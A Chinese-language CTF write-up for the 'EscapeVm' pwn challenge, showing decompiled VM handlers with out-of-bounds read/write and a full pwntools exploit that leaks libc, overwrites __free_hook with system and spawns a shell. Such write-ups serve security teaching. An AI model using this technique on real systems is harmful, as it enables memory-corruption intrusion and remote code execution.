# EscapeVm

不得不说这题很有意思，国赛的时候一堆的堆题，这题让人焕然一新。原先也解过类似的题目，但是我知道自己的逆向能力不太好，当时就没去看这题了。pizza真的tql

题目环境是Ubuntu16.04,libc是2.23的

题目的

```c
case 6:                                 // oob read
          v12 = (v22 >> 9) & 7;
          v13 = &reg->r0 + v12;
          *v13 = read_mem(
                   (*((unsigned __int16 *)&reg->r0 + ((v22 >> 6) & 7)) << 16)
                 + *((unsigned __int16 *)&reg->r0 + ((v22 >> 3) & 7)));
          update_eflag(v12);
          break;
        case 7:                                 // oob write
          sign_extend(v22 & 0x3F, 6);
          mem_write(
            (*((unsigned __int16 *)&reg->r0 + ((v22 >> 6) & 7)) << 16)
          + *((unsigned __int16 *)&reg->r0 + ((v22 >> 3) & 7)),
            *(&reg->r0 + ((v22 >> 9) & 7)));
          break;
```

存在越界读和写，然后因为申请的memory是在libc的上方，且和libc的偏移不变，所以可以通过越界读泄露libc地址，然后在越界写__free_hook为system的地址，然后退出的时候就能getshell，需要注意的是这个vm是大端的，所以要转一下字节序

```python
from pwn import *


def main(host,port=9017):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./escapevm")
		# p = process("./",env={"LD_PRELOAD":"./libc.so.6"})
		# gdb.attach(p,"b *0x56555000+0x001322")
	p.recvuntil("Input: ")
	p.send("\x00\x00")
	#leak stdout
	#r1 = 0xe
	payload = "b/nis/\x00h"+"\x00"*(0x6000-8)
	payload += "\x22\x80"
	#r2 = 0xa6fa
	payload += "\x24\x80"
	#r3 = stdout & 0xffff
	payload += "\x66\x50"
	#r4 = (stdout & 0xffff0000)>>16
	payload += "\x24\x7f"
	payload += "\x68\x50"
	#r2 = 0xa754
	payload += "\x24\x7e"
	#r5 = 0x17
	payload += "\x2a\x7e"
	#r6 = 0x8040
	payload += "\x2c\x7e"
	#r4 += r5
	payload += "\x19\x05"
	#r3 += r6
	payload += "\x16\xc6"

	#write free_hook
	payload += "\x76\x50"
	#r2 = 0xa755
	payload += "\x24\x7b"
	payload += "\x78\x50"
	payload += "\xf0\x26"
	payload = payload.ljust(0x6100,"\x00")
	payload += p16(0x0)+"\x00\x0e"+"\xa6\xfa"+"\xa6\xfb"
	payload += "\xac\x54"+"\xff\xe8"+"\x80\x40"+"\xac\x55"
	p.send(payload)
	
	p.interactive()
	
if __name__ == "__main__":
	
	main(args['REMOTE'])
```

参考链接： 
[https://xz.aliyun.com/t/5842](https://xz.aliyun.com/t/5842)
[https://justinmeiners.github.io/lc3-vm/](https://justinmeiners.github.io/lc3-vm/)
